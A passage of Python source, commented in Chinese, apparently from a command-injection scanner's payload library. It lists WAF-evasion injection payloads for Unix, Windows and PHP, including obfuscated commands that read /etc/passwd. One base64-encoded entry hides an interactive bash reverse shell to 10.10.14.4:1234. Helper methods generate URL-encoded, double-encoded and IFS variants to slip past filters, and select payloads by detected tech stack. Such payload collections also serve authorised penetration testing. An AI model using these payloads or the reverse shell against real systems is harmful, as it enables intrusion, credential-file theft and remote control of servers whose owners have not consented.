            Payload(";$IFS'ls';", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS加引号", expected_output="", is_harmless=False),
            Payload("; /???/??t /???/p??s??;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 通配符cat", expected_output="root:", is_harmless=False),
            Payload("; /bin/c[a]t /etc/p[a]sswd;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 中括号通配符", expected_output="root:", is_harmless=False),
            Payload("; c'a't /e'tc'/p'a'sswd;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - cat引号分割", expected_output="root:", is_harmless=False),
            Payload("; c\\at /e\\tc/p\\asswd;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - cat反斜杠", expected_output="root:", is_harmless=False),
            Payload(";{id,};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - id大括号", expected_output="uid=", is_harmless=False),
            Payload("; i''d;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - id引号分割", expected_output="uid=", is_harmless=False),
            Payload("; i\\d;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - id反斜杠", expected_output="uid=", is_harmless=False),
            Payload("%0aid", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - id换行编码", expected_output="uid=", is_harmless=False),
            Payload(";{cat,/etc/passwd};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - cat大括号参数", expected_output="root:", is_harmless=False),
            Payload(";$(printf'\\x63\\x61\\x74'/etc/passwd);", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - cat十六进制", expected_output="root:", is_harmless=False),
            Payload(";`{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}`;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 复杂管道", expected_output="", is_harmless=False),
            Payload(";$(tr 'A-Za-z' 'N-ZA-Mn-za-m'<<<'flf');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - ROT13编码", expected_output="", is_harmless=False),
            Payload(";$(rev<<<'sl');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 反转字符串", expected_output="", is_harmless=False),
            Payload(";$(xargs -n1<<<'l s');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - xargs分割", expected_output="", is_harmless=False),
            Payload(";$(awk 'BEGIN{system(\"ls\")}');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - awk执行", expected_output="", is_harmless=False),
            Payload(";$(find / -name passwd -exec cat {} \\;);", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - find执行", expected_output="root:", is_harmless=False),
            Payload(";$(perl -e 'system(\"ls\")');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - perl执行", expected_output="", is_harmless=False),
            Payload(";$(python -c 'import os;os.system(\"ls\")');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - python执行", expected_output="", is_harmless=False),
            Payload(";$(ruby -e 'system(\"ls\")');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - ruby执行", expected_output="", is_harmless=False),
            Payload(";$(php -r 'system(\"ls\");');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - php执行", expected_output="", is_harmless=False),
        ]
        
        self.windows_waf_bypass_payloads = [
            Payload("& d^ir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - Windows脱字符", expected_output="", is_harmless=False),
            Payload("& w^hoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - whoami脱字符", expected_output="", is_harmless=False),
            Payload("& di''r", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - Windows引号", expected_output="", is_harmless=False),
            Payload("& who''ami", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - whoami引号", expected_output="", is_harmless=False),
            Payload("& set /a=dir&call %a%", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - 变量调用", expected_output="", is_harmless=False),
            Payload("& for /f \"delims=\" %a in ('cmd /c echo dir') do %a", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - for循环", expected_output="", is_harmless=False),
            Payload("& c^m^d /c dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - cmd脱字符", expected_output="", is_harmless=False),
            Payload("& p^o^w^e^r^s^h^e^l^l dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - powershell脱字符", expected_output="", is_harmless=False),
            Payload("& c\"\"md /c dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - 双引号分割", expected_output="", is_harmless=False),
            Payload("& %COMSPEC% /c dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - COMSPEC变量", expected_output="", is_harmless=False),
            Payload("& %WINDIR%\\system32\\cmd.exe /c dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - 完整路径", expected_output="", is_harmless=False),
            Payload("& powershell -enc ZABpAHIA", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - PowerShell Base64", expected_output="", is_harmless=False),
            Payload("& cmd /c \"set p=dir&&call %%p%%\"", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - set变量执行", expected_output="", is_harmless=False),
            Payload("& w\"\"hoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - whoami双引号", expected_output="", is_harmless=False),
            Payload("& d^^ir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - 双重脱字符", expected_output="", is_harmless=False),
        ]
        
        self.php_waf_bypass_payloads = [
            Payload("sYsTeM('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP大小写", TechType.PHP, expected_output="", is_harmless=False),
            Payload("sys/**/tem('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP注释分割", TechType.PHP, expected_output="", is_harmless=False),
            Payload("(system)('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP括号", TechType.PHP, expected_output="", is_harmless=False),
            Payload("define('x','system');x('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP动态函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("$a='sys';$b='tem';$a.$b('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP字符串拼接", TechType.PHP, expected_output="", is_harmless=False),
            Payload("call_user_func('system','ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP回调函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("array_map('system',array('ls'));", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP array_map", TechType.PHP, expected_output="", is_harmless=False),
            Payload("assert('system(\"ls\")');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP assert", TechType.PHP, expected_output="", is_harmless=False),
            Payload("create_function('','system(\"ls\");')();", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP create_function", TechType.PHP, expected_output="", is_harmless=False),
            Payload("preg_replace('/.*/e','system(\"ls\")','');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP preg_replace", TechType.PHP, expected_output="", is_harmless=False),
            Payload("$_GET[0]($_GET[1]);&0=system&1=ls", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP变量函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("var_dump(`ls`);", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP反引号var_dump", TechType.PHP, expected_output="", is_harmless=False),
            Payload("print `ls`;", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP反引号print", TechType.PHP, expected_output="", is_harmless=False),
            Payload("die(`ls`);", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP反引号die", TechType.PHP, expected_output="", is_harmless=False),
            Payload("exit(`ls`);", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP反引号exit", TechType.PHP, expected_output="", is_harmless=False),
            Payload("echo shell_exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP echo执行", TechType.PHP, expected_output="", is_harmless=False),
            Payload("print shell_exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP print执行", TechType.PHP, expected_output="", is_harmless=False),
            Payload("ob_start('system');echo 'ls';ob_end_flush();", PayloadType.CODE_EXEC, OSType.BOTH, "WAF绕过 - PHP ob_start", TechType.PHP, expected_output="", is_harmless=False),
        ]
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """根据类型获取payload"""
        return [p for p in self.payloads if p.payload_type == payload_type]
    
    def get_payloads_by_os(self, os_type: OSType) -> List[Payload]:
        """根据操作系统获取payload"""
        return [p for p in self.payloads if p.os_type == os_type or p.os_type == OSType.BOTH]
    
    def get_payloads_by_tech(self, tech_type: TechType) -> List[Payload]:
        """根据技术栈获取payload"""
        all_payloads = self.get_all_payloads()
        return [p for p in all_payloads if p.tech_type == tech_type]
    
    def get_payloads_by_techs(self, tech_types: List[TechType]) -> List[Payload]:
        """根据多个技术栈获取payload"""
        all_payloads = self.get_all_payloads()
        tech_set = set(tech_types)
        return [p for p in all_payloads if p.tech_type and p.tech_type in tech_set]
    
    def get_time_based_payloads(self) -> List[Payload]:
        """获取时间盲注payload"""
        payloads = []
        payloads.extend(self.unix_time_payloads)
        payloads.extend(self.windows_time_payloads)
        return payloads
    
    def get_echo_based_payloads(self) -> List[Payload]:
        """获取回显型payload"""
        return self.get_payloads_by_type(PayloadType.ECHO_BASED)
    
    def get_dns_based_payloads(self) -> List[Payload]:
        """获取DNS外带payload"""
        return self.get_payloads_by_type(PayloadType.DNS_BASED)
    
    def url_encode(self, payload: Payload) -> Payload:
        """URL编码payload"""
        encoded_content = urllib.parse.quote(payload.content)
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (URL编码)",
            tech_type=payload.tech_type,
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def base64_encode(self, payload: Payload) -> Payload:
        """Base64编码payload"""
        encoded_content = base64.b64encode(payload.content.encode()).decode()
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (Base64编码)",
            tech_type=payload.tech_type,
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def double_url_encode(self, payload: Payload) -> Payload:
        """双重URL编码"""
        encoded_content = urllib.parse.quote(urllib.parse.quote(payload.content))
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (双重URL编码)",
            tech_type=payload.tech_type,
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def generate_variants(self, payload: Payload) -> List[Payload]:
        """生成payload变体"""
        variants = [payload]
        
        variants.append(self.url_encode(payload))
        variants.append(self.double_url_encode(payload))
        
        content_variants = [
            payload.content.replace(" ", "${IFS}"),
            payload.content.replace(" ", "%20"),
            payload.content.replace(" ", "$IFS"),
            payload.content.replace(";", "%3b"),
            payload.content.replace("|", "%7c"),
            payload.content.replace("&", "%26"),
        ]
        
        for i, content in enumerate(content_variants):
            if content != payload.content:
                variants.append(Payload(
                    content=content,
                    payload_type=payload.payload_type,
                    os_type=payload.os_type,
                    description=f"{payload.description} (变体{i+1})",
                    tech_type=payload.tech_type,
                    expected_delay=payload.expected_delay,
                    expected_output=payload.expected_output,
                    encoded=True
                ))
        
        return variants
    
    def add_custom_payload(self, content: str, payload_type: PayloadType, 
                          os_type: OSType, description: str,
                          tech_type: Optional[TechType] = None,
                          expected_delay: Optional[float] = None,
                          expected_output: Optional[str] = None):
        """添加自定义payload"""
        self.payloads.append(Payload(
            content=content,
            payload_type=payload_type,
            os_type=os_type,
            description=description,
            tech_type=tech_type,
            expected_delay=expected_delay,
            expected_output=expected_output
        ))
    
    def get_all_payloads(self) -> List[Payload]:
        """获取所有payload"""
        all_payloads = []
        all_payloads.extend(self.unix_time_payloads)
        all_payloads.extend(self.windows_time_payloads)
        all_payloads.extend(self.echo_test_payloads)
        all_payloads.extend(self.dns_payloads)
        all_payloads.extend(self.file_payloads)
        all_payloads.extend(self.unix_echo_payloads)
        all_payloads.extend(self.windows_echo_payloads)
        all_payloads.extend(self.php_code_exec_payloads)
        all_payloads.extend(self.jsp_code_exec_payloads)
        all_payloads.extend(self.asp_code_exec_payloads)
        all_payloads.extend(self.aspx_code_exec_payloads)
        all_payloads.extend(self.python_code_exec_payloads)
        all_payloads.extend(self.nodejs_code_exec_payloads)
        all_payloads.extend(self.ruby_code_exec_payloads)
        all_payloads.extend(self.go_code_exec_payloads)
        all_payloads.extend(self.perl_code_exec_payloads)
        all_payloads.extend(self.lua_code_exec_payloads)
        all_payloads.extend(self.coldfusion_code_exec_payloads)
        all_payloads.extend(self.template_payloads)
        all_payloads.extend(self.unix_waf_bypass_payloads)
        all_payloads.extend(self.windows_waf_bypass_payloads)
        if hasattr(self, 'php_waf_bypass_payloads'):
            all_payloads.extend(self.php_waf_bypass_payloads)
        return all_payloads
    
    def get_harmless_payloads(self) -> List[Payload]:
        """获取无害化payload（时间盲注类型）"""
        payloads = []
        payloads.extend(self.unix_time_payloads)
        payloads.extend(self.windows_time_payloads)
        return payloads
    
    def get_echo_payloads(self) -> List[Payload]:
        """获取有回显的payload（ls, whoami等）"""
        echo_payloads = []
        echo_payloads.extend(self.unix_echo_payloads)
        echo_payloads.extend(self.windows_echo_payloads)
        echo_payloads.extend(self.php_code_exec_payloads)
        echo_payloads.extend(self.jsp_code_exec_payloads)
        echo_payloads.extend(self.asp_code_exec_payloads)
        echo_payloads.extend(self.aspx_code_exec_payloads)
        echo_payloads.extend(self.python_code_exec_payloads)
        echo_payloads.extend(self.nodejs_code_exec_payloads)
        echo_payloads.extend(self.ruby_code_exec_payloads)
        echo_payloads.extend(self.go_code_exec_payloads)
        echo_payloads.extend(self.perl_code_exec_payloads)
        echo_payloads.extend(self.lua_code_exec_payloads)
        echo_payloads.extend(self.coldfusion_code_exec_payloads)
        echo_payloads.extend(self.template_payloads)
        return echo_payloads
    
    def get_waf_bypass_payloads(self) -> List[Payload]:
        """获取WAF绕过payload"""
        bypass_payloads = []
        bypass_payloads.extend(self.unix_waf_bypass_payloads)
        bypass_payloads.extend(self.windows_waf_bypass_payloads)
        if hasattr(self, 'php_waf_bypass_payloads'):
            bypass_payloads.extend(self.php_waf_bypass_payloads)
        return bypass_payloads
    
    def get_payloads_by_mode(self, mode: ScanMode) -> List[Payload]:
        """根据扫描模式获取payload"""
        if mode == ScanMode.HARMLESS:
            return self.get_harmless_payloads()
        elif mode == ScanMode.ECHO:
            return self.get_echo_payloads()
        elif mode == ScanMode.WAF_BYPASS:
            return self.get_waf_bypass_payloads()
        return self.get_all_payloads()
    
    def get_payloads_by_url(self, url: str, mode: ScanMode = ScanMode.ECHO) -> List[Payload]:
        """根据URL后缀获取对应语言的payload"""
        url_lower = url.lower()
        
        tech_payloads = self._detect_tech_from_url(url_lower)
        
        if tech_payloads:
            return tech_payloads
        
        all_payloads = []
        all_payloads.extend(self.php_code_exec_payloads)
        all_payloads.extend(self.jsp_code_exec_payloads)
        all_payloads.extend(self.asp_code_exec_payloads)
        all_payloads.extend(self.aspx_code_exec_payloads)
        all_payloads.extend(self.python_code_exec_payloads)
        all_payloads.extend(self.nodejs_code_exec_payloads)
        all_payloads.extend(self.ruby_code_exec_payloads)
        all_payloads.extend(self.go_code_exec_payloads)
        all_payloads.extend(self.perl_code_exec_payloads)
        all_payloads.extend(self.lua_code_exec_payloads)
        all_payloads.extend(self.coldfusion_code_exec_payloads)
        all_payloads.extend(self.template_payloads)
        all_payloads.extend(self.get_echo_payloads())
        
        seen = set()
        unique_payloads = []
        for p in all_payloads:
            if p.content not in seen:
                seen.add(p.content)
                unique_payloads.append(p)
        
        return unique_payloads
    
    def get_payloads_by_detected_techs(self, tech_types: List[TechType], 
                                        mode: ScanMode = ScanMode.ECHO) -> List[Payload]:
        """根据检测到的技术栈动态获取payload"""
        if not tech_types:
            return self.get_payloads_by_mode(mode)
        
        payloads = []
        
        for tech in tech_types:
            tech_payloads = self._get_payloads_for_tech(tech)
            if tech_payloads:
                payloads.extend(tech_payloads)
        
        payloads.extend(self.unix_echo_payloads)
        payloads.extend(self.windows_echo_payloads)
        
        if mode == ScanMode.WAF_BYPASS:
            payloads.extend(self.unix_waf_bypass_payloads)
            payloads.extend(self.windows_waf_bypass_payloads)
        
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p.content not in seen:
                seen.add(p.content)
                unique_payloads.append(p)
        
        return unique_payloads
    
    def _detect_tech_from_url(self, url_lower: str) -> List[Payload]:
        """从URL检测技术栈并返回对应Payload"""
        for tech, extensions in self.TECH_EXTENSIONS.items():
            for ext in extensions:
                if ext in url_lower:
                    return self._get_payloads_for_tech(tech)
        return []
    
    def _get_payloads_for_tech(self, tech: TechType) -> List[Payload]:
        """获取指定技术栈的Payload"""
        tech_map = {
            TechType.PHP: self.php_code_exec_payloads,
            TechType.JSP_JAVA: self.jsp_code_exec_payloads,
            TechType.ASP: self.asp_code_exec_payloads,
            TechType.ASPX_DOTNET: self.aspx_code_exec_payloads,
            TechType.PYTHON: self.python_code_exec_payloads,
            TechType.NODEJS: self.nodejs_code_exec_payloads,
            TechType.RUBY: self.ruby_code_exec_payloads,
            TechType.GO: self.go_code_exec_payloads,
            TechType.PERL: self.perl_code_exec_payloads,
            TechType.LUA: self.lua_code_exec_payloads,
            TechType.COLDFUSION: self.coldfusion_code_exec_payloads,
            TechType.TEMPLATE: self.template_payloads,
        }
        return tech_map.get(tech, [])
    
    def _get_php_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取PHP代码执行payload"""
        return self.php_code_exec_payloads.copy()
    
    def _get_jsp_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取JSP代码执行payload"""
        return self.jsp_code_exec_payloads.copy()
    
    def _get_asp_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取ASP代码执行payload"""
        return self.asp_code_exec_payloads.copy()
    
    def _get_aspx_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取ASPX代码执行payload"""
        return self.aspx_code_exec_payloads.copy()
    
    def _get_python_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Python代码执行payload"""
        return self.python_code_exec_payloads.copy()
    
    def _get_nodejs_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Node.js代码执行payload"""
        return self.nodejs_code_exec_payloads.copy()
    
    def _get_ruby_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Ruby代码执行payload"""
        return self.ruby_code_exec_payloads.copy()
    
    def _get_go_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Go代码执行payload"""
        return self.go_code_exec_payloads.copy()
    
    def _get_perl_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Perl代码执行payload"""
        return self.perl_code_exec_payloads.copy()
    
    def _get_lua_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Lua代码执行payload"""
        return self.lua_code_exec_payloads.copy()
    
    def _get_coldfusion_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取ColdFusion代码执行payload"""
        return self.coldfusion_code_exec_payloads.copy()
    
    def _get_template_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取模板注入payload"""
        return self.template_payloads.copy()
    
    def get_tech_statistics(self) -> Dict[str, int]:
        """获取各技术栈Payload统计"""
        waf_count = len(self.unix_waf_bypass_payloads) + len(self.windows_waf_bypass_payloads)
        if hasattr(self, 'php_waf_bypass_payloads'):
            waf_count += len(self.php_waf_bypass_payloads)
        return {
            'PHP': len(self.php_code_exec_payloads),
            'JSP/Java': len(self.jsp_code_exec_payloads),
            'ASP': len(self.asp_code_exec_payloads),
            'ASPX/.NET': len(self.aspx_code_exec_payloads),
            'Python': len(self.python_code_exec_payloads),
            'Node.js': len(self.nodejs_code_exec_payloads),
            'Ruby': len(self.ruby_code_exec_payloads),
            'Go': len(self.go_code_exec_payloads),
            'Perl': len(self.perl_code_exec_payloads),
            'Lua': len(self.lua_code_exec_payloads),
            'ColdFusion': len(self.coldfusion_code_exec_payloads),
            'Template Injection': len(self.template_payloads),
            'WAF Bypass': waf_count,
        }
